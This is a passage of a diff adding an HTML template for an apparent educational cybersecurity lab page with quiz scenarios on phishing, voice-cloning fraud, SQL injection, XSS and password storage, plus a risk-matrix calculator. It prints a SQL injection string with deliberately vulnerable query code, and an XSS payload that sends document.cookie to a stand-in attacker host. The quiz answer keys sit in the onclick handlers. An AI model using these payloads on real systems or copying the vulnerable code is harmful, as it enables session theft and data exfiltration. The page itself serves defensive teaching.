@@ -1,0 +1,1110 @@
+{% extends "layout.html" %}
+{% block title %}Cybersecurity Attack & Defense Lab – VoiceShield AI{% endblock %}
+{% block page_title %}⚡ Cybersecurity Attack &amp; Defense Lab{% endblock %}
+
+{% block content %}
+<div class="page-header fade-in">
+  <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;flex-wrap:wrap;">
+    <span class="badge badge-info" style="font-weight:700;">Course Code: 171405A</span>
+    <span class="badge badge-secondary">Cyber Security &amp; Laws Practical Lab</span>
+    <span class="badge badge-primary">Hands-On Simulation</span>
+  </div>
+  <h1>⚡ Cybersecurity Attack &amp; Defense Lab</h1>
+  <p style="max-width:850px;color:var(--text-secondary);line-height:1.6;">
+    An interactive simulation environment designed to complement VoiceShield AI's voice protection engine and SY B.Tech syllabus modules. Explore real-world attack vectors, rule-based threat risk modeling, digital forensics timeline reconstruction, and unified defense challenges in a safe, strictly educational sandbox.
+  </p>
+</div>
+
+<!-- Lab Navigation Jump Pills -->
+<div class="topic-nav-pills fade-in" style="margin-bottom:24px;">
+  <a href="#lab-overview" class="topic-nav-pill">🎯 Lab Overview</a>
+  <a href="#lab-simulator" class="topic-nav-pill">⚔️ 1. Attack Simulator</a>
+  <a href="#lab-risk-analyzer" class="topic-nav-pill">📊 2. Threat Risk Analyzer</a>
+  <a href="#lab-forensics-timeline" class="topic-nav-pill">🔍 3. Forensics Timeline</a>
+  <a href="#lab-challenges" class="topic-nav-pill" style="border-color:var(--accent);color:var(--accent);font-weight:700;">🏆 4. Challenge Zone</a>
+</div>
+
+<!-- SECTION 0: LAB OVERVIEW & ARCHITECTURE -->
+<div class="card mb-24 fade-in" id="lab-overview">
+  <div class="card-header">
+    <span class="card-title">🎯 Lab Overview &amp; Ethical Guardrails</span>
+    <span class="lab-badge badge-primary">Safe Sandbox</span>
+  </div>
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px;">
+    <div style="background:var(--bg-surface);padding:16px;border-radius:var(--radius);border:1px solid var(--border);">
+      <div style="font-size:1.2rem;margin-bottom:6px;">🛡️ Safe Fictional Sandbox</div>
+      <div style="font-size:0.84rem;color:var(--text-secondary);line-height:1.5;">
+        All simulations, SQL statements, script tags, and forensic log entries run in isolated client-side and rule-based server logic. No real external exploits, packet injection, or intrusive scans are executed.
+      </div>
+    </div>
+    <div style="background:var(--bg-surface);padding:16px;border-radius:var(--radius);border:1px solid var(--border);">
+      <div style="font-size:1.2rem;margin-bottom:6px;">⚖️ IT Act &amp; DPDP Alignment</div>
+      <div style="font-size:0.84rem;color:var(--text-secondary);line-height:1.5;">
+        Connects technical vulnerabilities (SQLi, XSS, vishing) directly with legal liabilities under Sections 43, 66, 66D of the Indian IT Act 2000 and Section 8 of the DPDP Act 2023.
+      </div>
+    </div>
+    <div style="background:var(--bg-surface);padding:16px;border-radius:var(--radius);border:1px solid var(--border);">
+      <div style="font-size:1.2rem;margin-bottom:6px;">📈 Transparent Risk Metrics</div>
+      <div style="font-size:0.84rem;color:var(--text-secondary);line-height:1.5;">
+        Threat risk calculations use deterministic NIST SP 800-30 / ISO 27005 5x5 matrices. Risk scores are transparently calculated without synthetic or misleading AI claims.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 1: INTERACTIVE ATTACK SIMULATOR -->
+<div class="card mb-24 fade-in" id="lab-simulator">
+  <div class="card-header">
+    <div>
+      <span class="card-title">⚔️ 1. Interactive Attack Simulator</span>
+      <div style="font-size:0.8rem;color:var(--text-muted);margin-top:2px;">
+        Examine 5 realistic attack scenarios, identify threat mechanics, and learn defense-in-depth mitigations.
+      </div>
+    </div>
+    <span class="badge badge-info">5 Scenarios</span>
+  </div>
+
+  <!-- Scenario 1: Phishing & Social Engineering -->
+  <div class="simulator-scenario-card" id="card-scenario-phishing">
+    <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;">
+      <div>
+        <span class="lab-badge badge-warning" style="margin-bottom:6px;">Scenario 1 of 5</span>
+        <h3 style="font-size:1.05rem;font-weight:700;margin:4px 0;color:var(--text-primary);">
+          🎣 Urgent Executive Wire Request (Spear-Phishing &amp; BEC)
+        </h3>
+      </div>
+      <span class="badge badge-secondary" style="font-size:0.75rem;">Social Engineering</span>
+    </div>
+    <p style="font-size:0.86rem;color:var(--text-secondary);margin:8px 0;">
+      An employee in accounts receives an email marked <strong>HIGH IMPORTANCE</strong> purportedly from the Chief Executive Officer requesting an immediate overseas wire transfer for a confidential corporate acquisition.
+    </p>
+
+    <!-- Mockup Preview -->
+    <div class="lab-mockup">
+      <div class="lab-mockup-header">
+        <span>📧 Inbound Email Header Inspector</span>
+        <span style="color:#f87171;">SUSPECT SENDER DOMAIN</span>
+      </div>
+      <div style="color:var(--text-muted);">From: "Rahul Sharma &lt;ceo@voiceshie1d-corp.com&gt;"</div>
+      <div style="color:var(--text-muted);">To: "Accounts Payable &lt;accounts@voiceshield.ai&gt;"</div>
+      <div style="color:var(--text-muted);">Subject: URGENT: Execute Overseas Acquisition Deposit (CONFIDENTIAL)</div>
+      <div style="margin-top:8px;padding-top:8px;border-top:1px dashed var(--border);color:#e2e8f0;">
+        "I am boarding a flight to London. Do not call my mobile. Wire $42,500 immediately to Account #IBAN-GB89321. Confirm via reply once dispatched."
+      </div>
+    </div>
+
+    <!-- Question -->
+    <div style="margin:14px 0 8px;font-weight:600;font-size:0.88rem;color:var(--text-primary);">
+      Which key indicator confirms this is a Business Email Compromise (BEC) spear-phishing attack?
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:8px;" id="q1-options">
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q1_choice" value="a" style="margin-right:10px;">
+        <span>A) The message was sent after normal office working hours.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q1_choice" value="b" style="margin-right:10px;">
+        <span>B) Look-alike spoofed domain (<code>voiceshie1d-corp.com</code> with numeral <code>1</code>) combined with artificial urgency and instruction to bypass voice verification.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q1_choice" value="c" style="margin-right:10px;">
+        <span>C) The dollar transaction amount exceeds $10,000.</span>
+      </label>
+    </div>
+
+    <div style="margin-top:12px;display:flex;gap:10px;">
+      <button class="btn btn-primary btn-sm" onclick="evaluateScenario('q1', 'b')">Submit Identification</button>
+      <button class="btn btn-secondary btn-sm" onclick="resetScenario('q1')">Reset</button>
+    </div>
+
+    <div class="simulator-explanation-box" id="q1-explanation">
+      <div id="q1-verdict" style="font-weight:700;margin-bottom:6px;"></div>
+      <p style="margin:0 0 8px;">
+        <strong>Threat Analysis:</strong> Attackers registered a typo-squatted domain substituting the letter <code>l</code> with numeral <code>1</code> (<code>voiceshie1d-corp.com</code>). They exploited social engineering authority heuristics, secrecy, and intentionally instructed the recipient not to place a phone call, eliminating verbal out-of-band confirmation.
+      </p>
+      <div class="simulator-impact-box">
+        <strong>⚠️ Potential Impact:</strong> Irreversible corporate financial loss, executive fraud liability, and breach of financial internal controls. Under IT Act Section 66D, this constitutes criminal cheating by personation.
+      </div>
+      <div class="simulator-prevention-box">
+        <strong>🛡️ Prevention &amp; Defense:</strong> Strict out-of-band verbal or dual-authorization protocol for all payments &gt; ₹50,000; DMARC, DKIM, and SPF domain authentication; and domain-squatting monitoring.
+      </div>
+    </div>
+  </div>
+
+  <!-- Scenario 2: Voice-Cloning Impersonation -->
+  <div class="simulator-scenario-card" id="card-scenario-voice">
+    <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;">
+      <div>
+        <span class="lab-badge badge-warning" style="margin-bottom:6px;">Scenario 2 of 5</span>
+        <h3 style="font-size:1.05rem;font-weight:700;margin:4px 0;color:var(--text-primary);">
+          🎙️ AI Voice-Cloning CFO Impersonation (Deepfake Vishing)
+        </h3>
+      </div>
+      <span class="badge badge-info" style="font-size:0.75rem;">VoiceShield AI Focus</span>
+    </div>
+    <p style="font-size:0.86rem;color:var(--text-secondary);margin:8px 0;">
+      A branch manager receives a WhatsApp audio call. The voice sounds identical to the Chief Financial Officer, requesting urgent one-time vendor credential release. VoiceShield AI acoustic sensors analyze the incoming stream.
+    </p>
+
+    <!-- Mockup Preview -->
+    <div class="lab-mockup">
+      <div class="lab-mockup-header">
+        <span>📊 VoiceShield Acoustic Spectrum Inspector</span>
+        <span style="color:#fbbf24;">ACOUSTIC ANOMALIES DETECTED</span>
+      </div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;font-size:0.78rem;">
+        <div>Spectral Flatness: <strong style="color:#f87171;">0.42 (Elevated)</strong></div>
+        <div>F0 Micro-Tremors: <strong style="color:#f87171;">Absent (Synthetic Vocoder)</strong></div>
+        <div>Phase Jitter: <strong style="color:#fbbf24;">Abnormal Glottal Pattern</strong></div>
+        <div>Background SNR: <strong style="color:#60a5fa;">38.4 dB (Studio Perfect)</strong></div>
+      </div>
+      <div style="margin-top:8px;padding-top:8px;border-top:1px dashed var(--border);color:#e2e8f0;font-style:italic;">
+        Audio Transcript: "Hey Pradeep, I'm stuck in an audit. Need the root database API token immediately. Don't message the Slack channel, just send it here."
+      </div>
+    </div>
+
+    <!-- Question -->
+    <div style="margin:14px 0 8px;font-weight:600;font-size:0.88rem;color:var(--text-primary);">
+      How should the employee verify the authenticity of this voice request?
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:8px;" id="q2-options">
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q2_choice" value="a" style="margin-right:10px;">
+        <span>A) Ask the caller to send a quick selfie or WhatsApp video note.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q2_choice" value="b" style="margin-right:10px;">
+        <span>B) Immediately disconnect and initiate an out-of-band callback over verified internal PBX or challenge with a pre-arranged shared secret passphrase.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q2_choice" value="c" style="margin-right:10px;">
+        <span>C) Trust the caller because the tone and vocal timbre match the CFO's real voice perfectly.</span>
+      </label>
+    </div>
+
+    <div style="margin-top:12px;display:flex;gap:10px;">
+      <button class="btn btn-primary btn-sm" onclick="evaluateScenario('q2', 'b')">Submit Identification</button>
+      <button class="btn btn-secondary btn-sm" onclick="resetScenario('q2')">Reset</button>
+    </div>
+
+    <div class="simulator-explanation-box" id="q2-explanation">
+      <div id="q2-verdict" style="font-weight:700;margin-bottom:6px;"></div>
+      <p style="margin:0 0 8px;">
+        <strong>Threat Analysis:</strong> Few-shot neural voice cloning models can clone a victim's vocal timbre with under 3 seconds of reference audio sampled from podcasts, YouTube videos, or earnings calls. However, neural vocoders frequently exhibit unnatural phase continuity and lack biological respiratory micro-tremors.
+      </p>
+      <div class="simulator-impact-box">
+        <strong>⚠️ Potential Impact:</strong> Unauthorized disclosure of root credentials, corporate espionage, and complete network takeover. Addressed under IT Act Section 43 (unauthorized access) and Section 66.
+      </div>
+      <div class="simulator-prevention-box">
+        <strong>🛡️ Prevention &amp; Defense:</strong> Zero Trust operational policy: Never transmit credentials or authorize fund transfers over phone calls; require multi-party approval and out-of-band challenge-response codes.
+      </div>
+    </div>
+  </div>
+
+  <!-- Scenario 3: SQL Injection Awareness -->
+  <div class="simulator-scenario-card" id="card-scenario-sqli">
+    <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;">
+      <div>
+        <span class="lab-badge badge-warning" style="margin-bottom:6px;">Scenario 3 of 5</span>
+        <h3 style="font-size:1.05rem;font-weight:700;margin:4px 0;color:var(--text-primary);">
+          💉 SQL Injection (SQLi) Vulnerability Awareness
+        </h3>
+      </div>
+      <span class="badge badge-secondary" style="font-size:0.75rem;">Fictional Isolated Demo</span>
+    </div>
+    <p style="font-size:0.86rem;color:var(--text-secondary);margin:8px 0;">
+      A legacy product catalog search endpoint constructs database queries by dynamically concatenating untrusted user input without parameterization.
+    </p>
+
+    <!-- Mockup Preview -->
+    <div class="lab-mockup">
+      <div class="lab-mockup-header">
+        <span>💻 Vulnerable Backend Code &amp; Query Construction</span>
+        <span style="color:#f87171;">CWE-89 SQL INJECTION</span>
+      </div>
+      <div style="color:#94a3b8;">// Vulnerable Python database execution pattern:</div>
+      <div style="color:#f87171;">raw_input = request.form['product_name']  # Input: ' OR '1'='1' --</div>
+      <div style="color:#f87171;">query = "SELECT * FROM catalog WHERE product = '" + raw_input + "';"</div>
+      <div style="margin-top:8px;padding-top:8px;border-top:1px dashed var(--border);color:#4ade80;">
+        Resulting Executed Query:<br>
+        <code>SELECT * FROM catalog WHERE product = '' OR '1'='1' --';</code>
+      </div>
+    </div>
+
+    <!-- Question -->
+    <div style="margin:14px 0 8px;font-weight:600;font-size:0.88rem;color:var(--text-primary);">
+      Why does the injected string <code>' OR '1'='1' --</code> successfully alter the database query logic?
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:8px;" id="q3-options">
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q3_choice" value="a" style="margin-right:10px;">
+        <span>A) The closing single quote breaks out of the string literal, <code>'1'='1'</code> evaluates to TRUE for every row, and <code>--</code> comments out the trailing query syntax.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q3_choice" value="b" style="margin-right:10px;">
+        <span>B) The database engine detects a syntax error and automatically prints all records as a debug fallback.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q3_choice" value="c" style="margin-right:10px;">
+        <span>C) The database driver encrypts the single quotes into administrative wildcard characters.</span>
+      </label>
+    </div>
+
+    <div style="margin-top:12px;display:flex;gap:10px;">
+      <button class="btn btn-primary btn-sm" onclick="evaluateScenario('q3', 'a')">Submit Identification</button>
+      <button class="btn btn-secondary btn-sm" onclick="resetScenario('q3')">Reset</button>
+    </div>
+
+    <div class="simulator-explanation-box" id="q3-explanation">
+      <div id="q3-verdict" style="font-weight:700;margin-bottom:6px;"></div>
+      <p style="margin:0 0 8px;">
+        <strong>Threat Analysis:</strong> Direct string concatenation blurs the boundary between SQL code instructions and user data. The single quote escapes data context, altering the Abstract Syntax Tree (AST) of the query.
+      </p>
+      <div class="simulator-impact-box">
+        <strong>⚠️ Potential Impact:</strong> Full database exfiltration, unauthorized modification or deletion of records, and potential remote code execution via database extensions (e.g. <code>xp_cmdshell</code>).
+      </div>
+      <div class="simulator-prevention-box">
+        <strong>🛡️ Prevention &amp; Defense:</strong> Always use <strong>Parameterized Queries (Prepared Statements)</strong> or modern ORMs (such as SQLAlchemy in VoiceShield AI), which treat user input strictly as data values, never as executable code.
+      </div>
+    </div>
+  </div>
+
+  <!-- Scenario 4: Cross-Site Scripting (XSS) Awareness -->
+  <div class="simulator-scenario-card" id="card-scenario-xss">
+    <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;">
+      <div>
+        <span class="lab-badge badge-warning" style="margin-bottom:6px;">Scenario 4 of 5</span>
+        <h3 style="font-size:1.05rem;font-weight:700;margin:4px 0;color:var(--text-primary);">
+          🌐 Cross-Site Scripting (Reflected &amp; Stored XSS) Awareness
+        </h3>
+      </div>
+      <span class="badge badge-secondary" style="font-size:0.75rem;">Harmless Demonstration</span>
+    </div>
+    <p style="font-size:0.86rem;color:var(--text-secondary);margin:8px 0;">
+      A forum web application prints user search queries directly back to the HTML Document Object Model (DOM) without sanitization or contextual HTML entity encoding.
+    </p>
+
+    <!-- Mockup Preview -->
+    <div class="lab-mockup">
+      <div class="lab-mockup-header">
+        <span>🔍 DOM Reflection Demonstration</span>
+        <span style="color:#f87171;">CWE-79 IMPROPER ENCODING</span>
+      </div>
+      <div style="color:#94a3b8;">// Vulnerable Jinja template usage without autoescape:</div>
+      <div style="color:#f87171;">&lt;div&gt;Search results for: {{ raw_query | safe }}&lt;/div&gt;</div>
+      <div style="margin-top:6px;color:#fbbf24;">User Payload: &lt;script&gt;fetch('https://attacker.site/steal?c=' + document.cookie)&lt;/script&gt;</div>
+      <div style="margin-top:8px;padding-top:8px;border-top:1px dashed var(--border);color:#94a3b8;">
+        Browser receives raw unescaped script tag and executes it in the victim's session context.
+      </div>
+    </div>
+
+    <!-- Question -->
+    <div style="margin:14px 0 8px;font-weight:600;font-size:0.88rem;color:var(--text-primary);">
+      Which primary defensive control protects session cookies from being accessed by client-side JavaScript in an XSS event?
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:8px;" id="q4-options">
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q4_choice" value="a" style="margin-right:10px;">
+        <span>A) Setting the <code>HttpOnly</code> cookie flag, combined with contextual HTML output encoding and Content Security Policy (CSP).</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q4_choice" value="b" style="margin-right:10px;">
+        <span>B) Writing client-side CSS rules to hide <code>&lt;script&gt;</code> tags.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q4_choice" value="c" style="margin-right:10px;">
+        <span>C) Changing all GET requests into POST requests.</span>
+      </label>
+    </div>
+
+    <div style="margin-top:12px;display:flex;gap:10px;">
+      <button class="btn btn-primary btn-sm" onclick="evaluateScenario('q4', 'a')">Submit Identification</button>
+      <button class="btn btn-secondary btn-sm" onclick="resetScenario('q4')">Reset</button>
+    </div>
+
+    <div class="simulator-explanation-box" id="q4-explanation">
+      <div id="q4-verdict" style="font-weight:700;margin-bottom:6px;"></div>
+      <p style="margin:0 0 8px;">
+        <strong>Threat Analysis:</strong> When an application renders untrusted user data as HTML without sanitization, the victim's browser cannot distinguish legitimate code from injected malicious scripts, executing it with the full privileges of the victim's authenticated session.
+      </p>
+      <div class="simulator-impact-box">
+        <strong>⚠️ Potential Impact:</strong> Session hijacking, account takeover, unauthorized actions executed on behalf of the user, and defacement.
+      </div>
+      <div class="simulator-prevention-box">
+        <strong>🛡️ Prevention &amp; Defense:</strong> Context-aware output encoding (default in Jinja2), strict <code>Content-Security-Policy</code> (CSP) headers, and storing session tokens in <code>HttpOnly</code>, <code>SameSite=Lax/Strict</code>, and <code>Secure</code> cookies.
+      </div>
+    </div>
+  </div>
+
+  <!-- Scenario 5: Password Security & Account Protection -->
+  <div class="simulator-scenario-card" id="card-scenario-passwords">
+    <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;">
+      <div>
+        <span class="lab-badge badge-warning" style="margin-bottom:6px;">Scenario 5 of 5</span>
+        <h3 style="font-size:1.05rem;font-weight:700;margin:4px 0;color:var(--text-primary);">
+          🔑 Credential Stuffing &amp; Password Storage Defenses
+        </h3>
+      </div>
+      <span class="badge badge-secondary" style="font-size:0.75rem;">Authentication Security</span>
+    </div>
+    <p style="font-size:0.86rem;color:var(--text-secondary);margin:8px 0;">
+      A threat actor acquires a breach database containing 500,000 plaintext username/password pairs and configures an automated credential-stuffing tool against a corporate login portal.
+    </p>
+
+    <!-- Mockup Preview -->
+    <div class="lab-mockup">
+      <div class="lab-mockup-header">
+        <span>🔒 Authentication Defense Comparison</span>
+        <span style="color:#60a5fa;">SECURE HASHING &amp; MFA</span>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;font-size:0.8rem;">
+        <div style="background:rgba(239,68,68,0.1);padding:8px 10px;border-radius:4px;border:1px solid rgba(239,68,68,0.3);">
+          <strong style="color:#f87171;">Flawed Legacy Model:</strong><br>
+          • Fast unsalted MD5 / SHA-1<br>
+          • Vulnerable to rainbow tables<br>
+          • No login rate limiting<br>
+          • Single-factor authentication only
+        </div>
+        <div style="background:rgba(34,197,94,0.1);padding:8px 10px;border-radius:4px;border:1px solid rgba(34,197,94,0.3);">
+          <strong style="color:#4ade80;">Modern Hardened Model:</strong><br>
+          • Argon2id / PBKDF2 / bcrypt<br>
+          • Unique cryptographically random salt<br>
+          • Account lockout &amp; IP rate limiting<br>
+          • Phishing-resistant MFA (FIDO2 / TOTP)
+        </div>
+      </div>
+    </div>
+
+    <!-- Question -->
+    <div style="margin:14px 0 8px;font-weight:600;font-size:0.88rem;color:var(--text-primary);">
+      Why is a cryptographically random "salt" essential when storing password hashes?
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:8px;" id="q5-options">
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q5_choice" value="a" style="margin-right:10px;">
+        <span>A) Salt prevents precomputed rainbow-table lookups and ensures identical passwords produce distinct hash values.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q5_choice" value="b" style="margin-right:10px;">
+        <span>B) Salt encrypts the database connection string over the network.</span>
+      </label>
+      <label class="form-check" style="background:var(--bg-card);padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);cursor:pointer;">
+        <input type="radio" name="q5_choice" value="c" style="margin-right:10px;">
+        <span>C) Salt automatically shortens user passwords to exactly 8 characters.</span>
+      </label>
+    </div>
+
+    <div style="margin-top:12px;display:flex;gap:10px;">
+      <button class="btn btn-primary btn-sm" onclick="evaluateScenario('q5', 'a')">Submit Identification</button>
+      <button class="btn btn-secondary btn-sm" onclick="resetScenario('q5')">Reset</button>
+    </div>
+
+    <div class="simulator-explanation-box" id="q5-explanation">
+      <div id="q5-verdict" style="font-weight:700;margin-bottom:6px;"></div>
+      <p style="margin:0 0 8px;">
+        <strong>Threat Analysis:</strong> Unsalted hashes allow an attacker to compute millions of common passwords in advance (rainbow tables) or crack identical passwords across multiple user accounts simultaneously.
+      </p>
+      <div class="simulator-impact-box">
+        <strong>⚠️ Potential Impact:</strong> Mass credential compromise, unauthorized lateral movement, and compliance violations under DPDP Act 2023 Section 8 (security safeguards failure).
+      </div>
+      <div class="simulator-prevention-box">
+        <strong>🛡️ Prevention &amp; Defense:</strong> Enforce slow memory-hard hashing (Argon2id or bcrypt with work factor ≥ 12), mandate multi-factor authentication (MFA), and monitor HaveIBeenPwned breach feeds.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 2: THREAT RISK ANALYZER -->
+<div class="card mb-24 fade-in" id="lab-risk-analyzer">
+  <div class="card-header">
+    <div>
+      <span class="card-title">📊 2. Threat Risk Analyzer</span>
+      <div style="font-size:0.8rem;color:var(--text-muted);margin-top:2px;">
+        Deterministic, rule-based 5x5 threat risk quantification aligned with NIST SP 800-30 &amp; ISO 27005 standards.
+      </div>
+    </div>
+    <span class="lab-badge badge-primary">Deterministic Engine</span>
+  </div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;" class="responsive-two-col">
+    <!-- Controls Form -->
+    <div>
+      <div class="form-group mb-16">
+        <label for="analyzer-scenario-select" style="font-weight:600;font-size:0.88rem;color:var(--text-primary);display:block;margin-bottom:6px;">
+          Select Standard Threat Scenario or Custom Context:
+        </label>
+        <select id="analyzer-scenario-select" class="form-control" onchange="handleScenarioSelectionChange()">
+          <option value="voice_cloning_wire_fraud">AI Voice Cloning Wire Fraud (CEO Vishing)</option>
+          <option value="sql_injection_exfiltration">SQL Injection Database Exfiltration (CWE-89)</option>
+          <option value="spear_phishing_credential_theft">Spear Phishing Credential Theft (BEC)</option>
+          <option value="ransomware_lateral_spread">Ransomware Payload with Lateral Movement</option>
+          <option value="insider_data_leak">Privileged Insider Unauthorized Data Export</option>
+          <option value="custom">-- Custom Security Assessment Scenario --</option>
+        </select>
+      </div>
+
+      <div class="form-group mb-16" id="custom-scenario-group" style="display:none;">
+        <label for="analyzer-custom-text" style="font-weight:600;font-size:0.88rem;color:var(--text-primary);display:block;margin-bottom:6px;">
+          Describe Custom Incident Context:
+        </label>
+        <input type="text" id="analyzer-custom-text" class="form-control" placeholder="e.g. Unsecured S3 bucket containing customer KYC scans">
+      </div>
+
+      <!-- Sliders -->
+      <div class="form-group mb-16">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+          <label style="font-weight:600;font-size:0.86rem;color:var(--text-primary);">
+            Threat Likelihood (1: Rare → 5: Almost Certain):
+          </label>
+          <span id="likelihood-val-display" style="font-weight:700;color:var(--accent);">4 / 5</span>
+        </div>
+        <input type="range" id="analyzer-likelihood" min="1" max="5" value="4" class="form-control" style="cursor:pointer;" oninput="updateSliderDisplay()">
+        <div style="display:flex;justify-content:space-between;font-size:0.72rem;color:var(--text-muted);margin-top:2px;">
+          <span>1: Rare</span>
+          <span>2: Unlikely</span>
+          <span>3: Moderate</span>
+          <span>4: Likely</span>
+          <span>5: Very High</span>
+        </div>
+      </div>
+
+      <div class="form-group mb-16">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+          <label style="font-weight:600;font-size:0.86rem;color:var(--text-primary);">
+            Asset Impact (1: Negligible → 5: Catastrophic):
+          </label>
+          <span id="impact-val-display" style="font-weight:700;color:var(--risk-high);">5 / 5</span>
+        </div>
+        <input type="range" id="analyzer-impact" min="1" max="5" value="5" class="form-control" style="cursor:pointer;" oninput="updateSliderDisplay()">
+        <div style="display:flex;justify-content:space-between;font-size:0.72rem;color:var(--text-muted);margin-top:2px;">
+          <span>1: Minor</span>
+          <span>2: Moderate</span>
+          <span>3: Significant</span>
+          <span>4: Major</span>
+          <span>5: Catastrophic</span>
+        </div>
+      </div>
+
+      <!-- Defensive Controls Applied -->
+      <div class="form-group mb-16">
+        <label style="font-weight:600;font-size:0.86rem;color:var(--text-primary);display:block;margin-bottom:8px;">
+          Applied Defense-in-Depth Controls (Risk Reducers):
+        </label>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+          <label class="form-check" style="font-size:0.82rem;background:var(--bg-surface);padding:8px 10px;border-radius:4px;border:1px solid var(--border);cursor:pointer;">
+            <input type="checkbox" id="ctrl-mfa" value="mfa" style="margin-right:6px;">
+            <span>Hardware MFA</span>
+          </label>
+          <label class="form-check" style="font-size:0.82rem;background:var(--bg-surface);padding:8px 10px;border-radius:4px;border:1px solid var(--border);cursor:pointer;">
+            <input type="checkbox" id="ctrl-segmentation" value="segmentation" style="margin-right:6px;">
+            <span>Micro-Segmentation</span>
+          </label>
+          <label class="form-check" style="font-size:0.82rem;background:var(--bg-surface);padding:8px 10px;border-radius:4px;border:1px solid var(--border);cursor:pointer;">
+            <input type="checkbox" id="ctrl-backups" value="backups" style="margin-right:6px;">
+            <span>Immutable Backups</span>
+          </label>
+          <label class="form-check" style="font-size:0.82rem;background:var(--bg-surface);padding:8px 10px;border-radius:4px;border:1px solid var(--border);cursor:pointer;">
+            <input type="checkbox" id="ctrl-training" value="training" style="margin-right:6px;">
+            <span>Awareness Drills</span>
+          </label>
+        </div>
+      </div>
+
+      <button class="btn btn-primary" style="width:100%;" onclick="runThreatRiskAnalysis()">
+        Calculate Transparent Risk Score
+      </button>
+
+      <div style="margin-top:10px;background:var(--bg-surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:10px 12px;font-size:0.75rem;color:var(--text-secondary);line-height:1.5;">
+        ⚙️ <strong>Formula &amp; Control Mechanics (NIST SP 800-30 / ISO 27005):</strong><br>
+        <code>Composite Risk Score = Effective Likelihood × Effective Impact (Bounded 1.0 – 25.0)</code><br>
+        • <strong>Likelihood Reducers (MFA, Awareness Training):</strong> Toggling Hardware MFA or Training applies a $-0.24$ discount per control to Threat Likelihood by reducing susceptibility to initial unauthorized access.<br>
+        • <strong>Impact Mitigators (Micro-Segmentation, Backups):</strong> Toggling Segmentation or Immutable Backups applies a $-0.16$ discount per control to Asset Impact by restricting lateral spread and data destruction.
+      </div>
+    </div>
+
+    <!-- Visual 5x5 Matrix & Assessment Output -->
+    <div style="background:var(--bg-surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;">
+        <h4 style="font-size:0.92rem;font-weight:700;color:var(--text-primary);margin:0;">
+          5×5 Quantitative Risk Matrix
+        </h4>
+        <span id="risk-tier-badge" class="badge badge-danger" style="font-size:0.8rem;padding:4px 10px;">
+          CRITICAL RISK (Score: 20)
+        </span>
+      </div>
+
+      <!-- 5x5 Grid: Rows = Impact (5 down to 1), Cols = Likelihood (1 to 5) -->
+      <div class="risk-matrix-grid" id="matrix-grid-container" style="margin-top:12px;">
+        <!-- Generated via JavaScript for clean active highlighting -->
+      </div>
+      <div style="display:flex;justify-content:space-between;font-size:0.7rem;color:var(--text-muted);margin-top:4px;">
+        <span>Impact (Vertical) ↑</span>
+        <span>Likelihood (Horizontal) →</span>
+      </div>
+
+      <!-- Detailed Analysis Output -->
